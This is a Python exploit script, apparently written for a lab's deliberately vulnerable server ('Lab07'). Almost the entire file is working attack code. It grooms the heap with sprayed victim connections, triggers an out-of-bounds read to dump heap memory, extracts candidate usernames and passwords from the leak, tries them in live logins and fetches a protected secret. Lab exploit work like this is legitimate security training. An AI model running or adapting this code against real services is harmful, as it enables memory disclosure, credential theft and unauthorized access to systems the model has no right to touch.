#!/usr/bin/env python3
"""
exploit_tuned.py
Aggressive heap-grooming + OOB-read exploit for the Lab07 vulnerable server.

Usage:
    python3 exploit_tuned.py <HOST> <PORT>

This script:
 - tries two burst strategies per iteration (victim-first and attacker-first),
 - sprays many victim connections and keeps them alive a short time,
 - varies attacker and victim allocation sizes (to target different malloc bins),
 - requests a large GET_USER (type 1) read to dump heap memory,
 - parses dumps for printable null-terminated strings and builds candidate (user,pass) pairs,
 - tries candidates live; on auth success it immediately requests and prints the secret,
 - saves the raw dump that produced the successful result.

Tuning suggestions:
 - Increase ITERATIONS for more trials (default 1200).
 - If fiddling fails, increase VICTIMS or hold times.
 - This is noisy and intentionally aggressive for reliability in lab conditions.
"""
import socket, struct, time, sys, random, string, os

if len(sys.argv) < 3:
    print("Usage: python3 exploit_tuned.py HOST PORT")
    raise SystemExit(1)

HOST = sys.argv[1]
PORT = int(sys.argv[2], 0)

# ---- parameters (tweak as needed) ----
ITERATIONS = 1200
LEAK_SIZES = [0xfff0, 0xff00, 0xffff]
ATTACKER_SIZES = [4, 8, 12, 16, 24, 32]
VICTIM_USER_SIZES = [8, 12, 16, 24, 32]
VICTIM_PASS_SIZES = [8, 10, 12, 16, 24]
VICTIMS_OPTIONS = [6, 8, 12]   # number of victims to spray
HOLD_MIN = 0.18
HOLD_MAX = 0.30
JITTER_MAX = 0.03
DUMP_SAVE_DIR = "dumps"
os.makedirs(DUMP_SAVE_DIR, exist_ok=True)

PRINTABLE = set(bytes(string.printable, "ascii"))

# ---- helpers ----
def recvn(s, n, timeout=1.0):
    s.settimeout(timeout)
    b = b''
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except Exception:
            break
        if not c:
            break
        b += c
    return b

def make_conn():
    s = socket.socket()
    s.settimeout(2.0)
    s.connect((HOST, PORT))
    # greeting
    _ = recvn(s, 1, timeout=1.0)
    return s

def send_header(s, t, payload_len):
    s.send(struct.pack("<BH", t, payload_len))

def set_user_on_socket(s, uname_bytes):
    # send type 0 with uname (expecting null-terminated username)
    s.send(struct.pack("<BH", 0, len(uname_bytes)) + uname_bytes)
    ack = recvn(s, 1, timeout=0.6)
    if ack != b'\x06':
        return False
    _ = recvn(s, len(uname_bytes), timeout=0.6)
    return True

def try_pass_on_socket(s, pass_bytes):
    s.send(struct.pack("<BH", 2, len(pass_bytes)) + pass_bytes)
    ack = recvn(s, 1, timeout=0.6)
    return ack == b'\x08'

def leak_from_socket_after_set_user(sock, leak_size):
    # sock: already used to set user by caller; we now issue type 1 read
    sock.send(struct.pack("<BH", 1, leak_size))
    ack = recvn(sock, 1, timeout=0.6)
    if not ack:
        sock.close()
        return None
    data = recvn(sock, leak_size, timeout=1.2)
    sock.close()
    return data

def extract_printable_strings(data, min_len=3):
    res = []
    i = 0
    L = len(data)
    while i < L:
        # skip nulls and non-printable
        if data[i] in PRINTABLE and data[i] != 0:
            j = i
            while j < L and data[j] in PRINTABLE and data[j] != 0:
                j += 1
            if j - i >= min_len:
                res.append((i, data[i:j]))
            i = j
        else:
            i += 1
    return res

def build_candidates(data, max_gap=64):
    strs = extract_printable_strings(data, min_len=3)
    candidates = []
    # adjacent pairs within gap -> (user,pass)
    for k in range(len(strs)-1):
        off1, s1 = strs[k]
        off2, s2 = strs[k+1]
        gap = off2 - (off1 + len(s1))
        if 0 <= gap <= max_gap:
            candidates.append((s1 + b'\x00', s2 + b'\x00'))
    # also try single strings with common passwords
    commons = [b'password\x00', b'pass\x00', b'1234\x00']
    for off,s in strs:
        for p in commons:
            candidates.append((s + b'\x00', p))
    # unique preserving order
    seen = set()
    out = []
    for u,p in candidates:
        key = (u,p)
        if key not in seen:
            seen.add(key)
            out.append((u,p))
    return out

def try_candidates_live(candidates, show_try=False):
    for (u,p) in candidates:
        if show_try:
            print("  trying candidate:", u, p)
        try:
            s = make_conn()
            # set user
            set_user_on_socket(s, u[:-1])  # set_user helper expects raw bytes without extra null (we already put null)
            # try pass
            s.send(struct.pack("<BH", 2, len(p)) + p)
            ack = recvn(s, 1, timeout=0.6)
            if ack == b'\x08':
                print("[+] Valid creds:", u, p)
                # request secret
                s.send(struct.pack("<BH", 4, 0xffff))
                if recvn(s,1, timeout=0.6) == b'\x0a':
                    secret = recvn(s, 65535, timeout=1.2)
                    print("[+] Secret (snippet):", secret[:300])
                else:
                    print("[!] Auth succeeded but no secret ack")
                s.close()
                return (u,p,secret if 'secret' in locals() else None)
            s.close()
        except Exception:
            pass
    return None

# ---- core iteration functions ----
def make_victim_socket(username, password, hold_time):
    s = make_conn()
    set_user_on_socket(s, username)
    # send try pass
    s.send(struct.pack("<BH", 2, len(password)) + password)
    _ = recvn(s, 1, timeout=0.6)
    # leave socket open for 'hold_time' seconds
    time.sleep(hold_time)
    return s

def one_burst(leak_size, attacker_size, victim_user_size, victim_pass_size, victims_count, order):
    # returns (dump, candidates) or (None, None)
    victim_sockets = []
    att_sock = None
    try:
        if order == "victim-first":
            # create victims (spray)
            for i in range(victims_count):
                u = (b'V' * (victim_user_size-1)) + (bytes([48 + (i % 10)])) + b'\x00'
                p = (b'P' * (victim_pass_size-1)) + (bytes([48 + (i % 10)])) + b'\x00'
                s = make_victim_socket(u, p, hold_time=random.uniform(HOLD_MIN, HOLD_MAX))
                victim_sockets.append(s)
                time.sleep(0.005 + random.random() * 0.01)
            # attacker connection with small user
            att_sock = make_conn()
            set_user_on_socket(att_sock, (b'A' * (attacker_size-1)) + b'0\x00')
            time.sleep(0.005 + random.random() * 0.01)
            data = leak_from_socket_after_set_user(att_sock, leak_size)
        else:
            # attacker-first
            att_sock = make_conn()
            set_user_on_socket(att_sock, (b'A' * (attacker_size-1)) + b'X\x00')
            time.sleep(0.005 + random.random() * 0.02)
            for i in range(victims_count):
                u = (b'V' * (victim_user_size-1)) + (bytes([48 + (i % 10)])) + b'\x00'
                p = (b'P' * (victim_pass_size-1)) + (bytes([48 + (i % 10)])) + b'\x00'
                s = make_victim_socket(u, p, hold_time=random.uniform(HOLD_MIN, HOLD_MAX))
                victim_sockets.append(s)
                time.sleep(0.003 + random.random() * 0.01)
            data = leak_from_socket_after_set_user(att_sock, leak_size)
        # close victims sockets to free resources
        for s in victim_sockets:
            try: s.close()
            except: pass
        return data
    finally:
        try:
            if att_sock: att_sock.close()
        except: pass
        for s in victim_sockets:
            try: s.close()
            except: pass

# ---- master loop ----
def main():
    print("[*] Exploit starting – target %s:%d" % (HOST, PORT))
    iter_no = 0
    random.seed(int(time.time()) ^ os.getpid())
    for it in range(ITERATIONS):
        iter_no += 1
        leak_size = random.choice(LEAK_SIZES)
        attacker_size = random.choice(ATTACKER_SIZES)
        victim_user_size = random.choice(VICTIM_USER_SIZES)
        victim_pass_size = random.choice(VICTIM_PASS_SIZES)
        victims_count = random.choice(VICTIMS_OPTIONS)
        # do both burst orders for coverage
        for order in ("victim-first", "attacker-first"):
            data = one_burst(leak_size, attacker_size, victim_user_size, victim_pass_size, victims_count, order)
            if not data:
                continue
            # quick check: we expect dump starts with attacker user bytes; still parse whole dump
            print(f"iter {it} order {order} dump len {len(data)}")
            candidates = build_candidates(data, max_gap=64)
            if candidates:
                print(f"  found {len(candidates)} candidate pairs — trying live auth")
                res = try_candidates_live(candidates, show_try=True)
                # save dump in any case
                name = os.path.join(DUMP_SAVE_DIR, f"dump_it{it}_{order}.bin")
                open(name,"wb").write(data)
                print("  saved dump ->", name)
                if res:
                    u,p,secret = res
                    print("[+] Exploit SUCCESS on iteration", it, "order", order)
                    print("[+] credentials:", u, p)
                    if secret:
                        print("[+] secret snippet:", secret[:400])
                    print("[*] saved dump:", name)
                    return
            # small jitter between attempts
            time.sleep(0.01 + random.random() * JITTER_MAX)
        if it % 20 == 0:
            print("[*] iteration", it, "no success yet (params example)", leak_size, attacker_size, victim_user_size, victim_pass_size, victims_count)
    print("[-] Done all iterations; no credentials found. Try increasing ITERATIONS, VICTIMS, or altering timing.")

if __name__ == "__main__":
    main()
